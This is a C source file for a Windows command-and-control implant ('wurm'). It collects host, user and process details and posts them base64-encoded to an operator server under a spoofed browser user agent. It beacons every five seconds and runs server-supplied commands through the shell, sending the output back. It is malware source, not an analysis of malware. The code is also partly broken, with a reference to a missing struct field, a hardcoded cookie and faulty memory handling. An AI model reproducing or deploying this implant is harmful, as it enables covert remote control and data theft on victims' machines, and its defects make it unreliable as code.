#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

#define patch_length 2

void Request(); // I need to develop actual header files just ignore this for now so that gcc can be quiet
void Beacon();

struct {
    struct {
        CHAR*   address;
        CHAR*   path;
        CHAR*   user_agent;
        INT     port;
    } http;
    struct {
        CHAR*   cookie;
        CHAR*   keyword;
    } auth;
    struct {
        CHAR*   status;
        CHAR*   format;
        CHAR*   buffer; // must be freed
        CHAR*   encode; // must be freed
        CHAR    length[MAX_PATH];
        DWORD   size;
    } data;
    struct {
        CHAR*   name; // must be freed
        CHAR    hostname[MAX_PATH];
        CHAR    username[MAX_PATH];
        CHAR    arch[MAX_PATH];
        CHAR    product[MAX_PATH];
        DWORD   pid;
    } info;
    struct {
        INT     count;
    } beacon;
} wurm;

unsigned char patch_list_name[patch_length] = {0xAA, 0xAB};

BOOL AA$shell(CHAR* input, CHAR** output) {
    printf("Attempting to execute: %s\n", input);
    FILE *out;
    CHAR buf[100];
    CHAR* str = NULL;
    CHAR* temp = NULL;
    unsigned int size = 1;
    unsigned int strlength;

    if (NULL == (out = popen(input, "r"))) {
        perror("popen");
        exit(EXIT_FAILURE);
    }

    while (fgets(buf, sizeof(buf), out) != NULL) {
        strlength = strlen(buf);
        temp = realloc(str, size + strlength);  // allocate room for the buf that gets appended
        if (temp == NULL) {
            // allocation error
        } else {
            str = temp;
        }
        strcpy(str + size - 1, buf);     // append buffer to str
        size += strlength; 
    }

    *output = _strdup(str);

    pclose(out);
    return TRUE;
}

BOOL AB$whoami(CHAR* input, CHAR** output) {
    DWORD username_buffer = 256;
    CHAR username[256];
    if (GetUserNameA(username, &username_buffer)) {
        *output = (CHAR*) calloc(strlen(username) + 1, sizeof(CHAR));
        strcat_s(*output, strlen(username) + 1, username);
        return TRUE;
    }
    return FALSE;
}

BOOL (*patch_list_pointers[patch_length]) (CHAR* input, CHAR **output) = {AA$shell, AB$whoami};

void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
    // Allocate memory and store length of data
    DWORD encoded_data_length = strlen(data_to_encode) * 2;
    wurm.data.encode = (CHAR*) malloc(encoded_data_length);
    
    // Encrypt data, this can be any encrpytion function as long as it returns a pointer to wurm.data.encode
    CryptBinaryToStringA((BYTE *) data_to_encode, data_to_encode_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, wurm.data.encode, &encoded_data_length);
}

void Package(CHAR* buffer) {
    // Set local variables
    CHAR* carriage_return = "%s\r\n\r\n"; // Used as padding to send data
    CHAR* content_length_header = "Content-Length: %lu\r\n"; // Used as a header format
    DWORD dw_error = GetLastError();

    // Allocate buffer and define variables for structure
    DWORD package_length = strlen(buffer) + 5;
    CHAR* package = (CHAR*) calloc(package_length, sizeof(CHAR));
    sprintf_s(package, package_length, carriage_return, buffer);

    // Set local variables to data structure
    sprintf_s(wurm.data.length, MAX_PATH, content_length_header, package_length);
    wurm.data.buffer = package;
    wurm.data.size = package_length;

    if (strcmp(wurm.data.buffer, "") == 0) {
        printf("Error: %lu\n", dw_error);
    } else {
        printf("Allocated buffer: %s\n", wurm.data.buffer);
    }

    if (strcmp(wurm.data.length, "") == 0) {
        printf("Error: %lu\n", dw_error);
    } else {
        printf("Header set: %s\n", wurm.data.length);
    }

    // Clean up memory
    goto cleanup;
    cleanup:
        free(buffer);
}

void Process(CHAR* command, CHAR* input) {
    // Set local variables
    CHAR* output = NULL;
    INT hex_command = atoi(command);
    CHAR* data_pointer = NULL;

    printf("Processing command: %s\n", command);
    printf("Hex Value: 0x%x\n", hex_command);
    printf("Command input: %s\n", input);

    // Convert hex value to command pointer and execute
    for (int i = 0; i < patch_length; i++) {
        if (hex_command == patch_list_name[i]) {
            printf("Executing Command\n");
            if ((*patch_list_pointers[i])(input, &output)) {
                printf("Output:%s\n", output);
                goto send_output;
                goto cleanup;
            }
        }
    }

    // Try to execute in cmd.exe if cannot be found in patch list
    CHAR* command_input = strdup(command); // Must be freed
    strcat(command_input, " "); 
    strcat(command_input, input); 
    if ((*patch_list_pointers[0])(command_input, &output)) { // index 0 of patch list is shell function
        printf("Output:%s", output);
        goto send_output;
        goto cleanup;
    }

    // Format and encode output to be sent back to the server
    send_output:
        // Auth cookie can be added to the request if needed
        if (output != NULL) {
            // Set data allocation format
            wurm.data.status = "output";
            wurm.data.format = "%s:%s";

            // Allocate memory to be encoded
            DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(output);
            CHAR* data_pointer = malloc(pointer_length); // Must be freed
            sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, output);

            // Base-64 encode the allocated data structure 
            DWORD data_length = strlen(wurm.data.status) + strlen(output) + 1; // Add null byte
            Encode(data_pointer, data_length);

            // Allocate buffer in data structure
            CHAR* buffer = wurm.data.encode;
            Package(buffer);

            // Send request to server
            Request();

            goto cleanup;
        }

    // Clean up memory
    goto cleanup;
    cleanup:
        free(data_pointer);
        free(input);
        free(command_input);
        free(output);
        Beacon(); // This should be return but return is crashing so :shrug:
}

void Request() {
    // Set local variables
    HINTERNET hInternet; // Must be closed
    HINTERNET hConnect; // Must be closed
    HINTERNET hRequest; // Must be closed
    CHAR* cookie = NULL;
    CHAR* query_buffer = NULL; 
    DWORD read_buffer;
    DWORD buffer_length = 0;
    DWORD available_size = 0;  
    DWORD dw_error = GetLastError();

    printf("Current Status: %s\n", wurm.data.status);

    wurm.beacon.count += 1; // Note: move before process_cookie label once tested with new server refactor

    // Set handle to initialize wininet functions
    hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Error: %lu\n", dw_error);
        goto cleanup;
    }

    // Set handle to connect to specified address and port
    hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL) {
        printf("Error: %lu\n", dw_error);
        goto cleanup;
    }

    // Set handle to store a request to be sent
    hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
    if (hRequest == NULL) {
        printf("Error: %lu\n", dw_error);
        goto cleanup;
    }

    // Add request headers and send previously stored request handle
    if (hInternet != NULL && hConnect != NULL && hRequest != NULL) {
        HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD); // Set content-length header 
        if (HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size) == FALSE) {
            printf("Error: %lu\n", dw_error);
            goto cleanup;
        }

        if (strcmp(wurm.data.status, "output") == 0) {
            goto cleanup;
        }

        printf("Response received\n");

        // Check the size of buffer the server wants to send
        BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);

        if (available == FALSE || available_size == 0) {
            printf("Error: %lu\n", dw_error);
            goto cleanup;
        }

        // Allocate size of response to buffer
        query_buffer = (CHAR*)realloc(query_buffer, available_size + 1);
        memset(query_buffer, 0, available_size + 1);

        // Write the response to buffer and store number of bytes written
        BOOL value = InternetReadFile(hRequest, query_buffer, available_size, &read_buffer);

        if (value == FALSE|| read_buffer == 0) {
            printf("Error: %lu\n", dw_error);
            goto cleanup;
        }

        // Store the buffer in a local cookie
        buffer_length += read_buffer; // Add number of bytes read to length
        cookie = (CHAR*) realloc(cookie, buffer_length + 1); // Allocate bytes to cookie
        sprintf_s(cookie, buffer_length + 1, "%s\0", query_buffer); // Write buffer + null byte to allocated cookie

        printf("Cookie: %s\n", cookie);

        goto process_cookie;

    } else {
        printf("Error: %lu\n", dw_error);
    }

    // Tokenize the cookie and either store or send to be processed as a command
    process_cookie:
        if (wurm.beacon.count <= 1) {
            CHAR* token = strtok(cookie, " ");

            if (strtok(NULL, " ") == NULL && strlen(cookie) == 20) {
                wurm.auth.cookie = token;
            } else {
                printf("Error: Unknown response");
            }
        } else {
            CHAR* token = strtok(cookie, " ");
            CHAR* input = strdup(""); // strdup is required to work with strcat, must be freed
            CHAR* cmd = token;
            INT count = 0;
            printf("Command found: %s\n", cmd);
            while (token != NULL) {
                count += 1;
                if (count == 1) {
                    token = strtok(NULL, " ");
                    continue;
                } else {
                    printf("Token: %s\n", token);
                    CHAR* input_parameter = strdup(token); // Must be freed
                    strcat(input_parameter, " ");
                    strcat(input, input_parameter);
                    free(input_parameter);
                }
                token = strtok(NULL, " ");
            }
                
            Process(cmd, input);
        }

    // Clean up memory and handles
    goto cleanup;
    cleanup:
        free(wurm.data.buffer);
        free(query_buffer);
        free(cookie);
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hRequest);
        return;
}

void Register() {
    /*
    Registration data structure:
        Format (Status:Hostname,Username,PID,Process Name, Arch)
        Strings/Integers:
            Status          8 
            Hostname        256
            Username        256
            Process Name    256
            Arch            256
        DWORDS:
            PID             4
    */

    // Set local variables
    DWORD default_length = 256;
    DWORD dw_error = GetLastError();

    // Structures and handles for tlhelp32
    PROCESSENTRY32 process_info;
    process_info.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Must be closed

    // Set data allocation format
    wurm.data.status = "register";
    wurm.data.format = "%s:%s,%s,%d,%s,%s";

    // Enumerate local machine for information
    if (GetComputerNameA(wurm.info.hostname, &default_length)) {
        printf("Hostname: %s\n", wurm.info.hostname);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetUserNameA(wurm.info.username, &default_length)) {
        printf("Username: %s\n", wurm.info.username);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetCurrentProcessId()) {
        wurm.info.pid = GetCurrentProcessId();
        printf("Process ID: %lu\n", wurm.info.pid);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (Process32First(snapshot, &process_info)) {
        while (Process32Next(snapshot, &process_info)) {
            if (wurm.info.pid == process_info.th32ProcessID) {
                wurm.info.name = _strdup(process_info.szExeFile);
                printf("Process Name: %s\n", wurm.info.name);
            }
        }
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", wurm.info.arch, default_length)) {
        printf("Operating System Arch: %s\n", wurm.info.arch);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    // Allocate memory to be encoded
    DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + strlen(wurm.info.keyword);
    CHAR* data_pointer = malloc(pointer_length); // Must be freed
    sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, wurm.info.hostname, wurm.info.username, wurm.info.pid, wurm.info.name, wurm.info.arch);

    // Base-64 encode the allocated data structure 
    DWORD data_length = strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch) + strlen(wurm.info.keyword) + 2; // Add two null bytes
    Encode(data_pointer, data_length);

    // Allocate buffer in data structure
    CHAR* buffer = wurm.data.encode;
    Package(buffer);

    // Send request to server
    Request();

    // Clean up memory and handles
    goto cleanup;
    cleanup: 
        CloseHandle(snapshot);
        free(data_pointer);
        free(wurm.info.name); // Strdup requires variable to be freed
}

void Beacon() {
    /*
    Baecon data structure:
        Format (Status:Key)
        Strings/Integers:
            Status          8 
            Key/Cookie      16
    */

    // Set local variables
    // DWORD dw_error = GetLastError();

    // Set data allocation format
    wurm.data.status = "beacon";
    wurm.data.format = "%s:%s";

    wurm.auth.cookie = "bean";

    if (wurm.auth.cookie == NULL) {
        printf("Error: Cookie not set\n");
        exit(1);
    }

    // Allocate memory to be encoded
    DWORD pointer_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.auth.cookie);
    CHAR* data_pointer = malloc(pointer_length); // Must be freed
    sprintf_s(data_pointer, pointer_length, wurm.data.format, wurm.data.status, wurm.auth.cookie);

    // Base-64 encode the allocated data structure 
    DWORD data_length = strlen(wurm.data.status) + strlen(wurm.auth.cookie) + 1; // Add null byte
    Encode(data_pointer, data_length);

    // Allocate buffer in data structure
    CHAR* buffer = wurm.data.encode;
    Package(buffer);

    // Send request to server
    Request();

    // Clean up memory
    goto cleanup;
    cleanup:
        free(data_pointer);
}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        wurm.http.address = argv[1];
        wurm.http.port = 1337;

    }
    else if (argc == 3) {
        wurm.http.address = argv[1];
        wurm.http.port = atoi(argv[2]);

    }
    else {
        wurm.http.address = "127.0.0.1";
        wurm.http.port = 1337;
    }

    printf("Attempting to connect to: %s:%d\n", wurm.http.address, wurm.http.port);

    // Set default HTTP options
    wurm.http.path = "images";
    wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";

    // Set default authentication options
    wurm.auth.cookie = NULL;
    wurm.auth.keyword = "licketysplit";

    // Attempt initial beacon with registration data
    // Note: To properly send a beacon, a format and status must be set, data must be encoded and stored, then a buffer must be set along with its size and length 
    Register();

    while (TRUE) {
        Beacon();
        Sleep(5000);
    }
}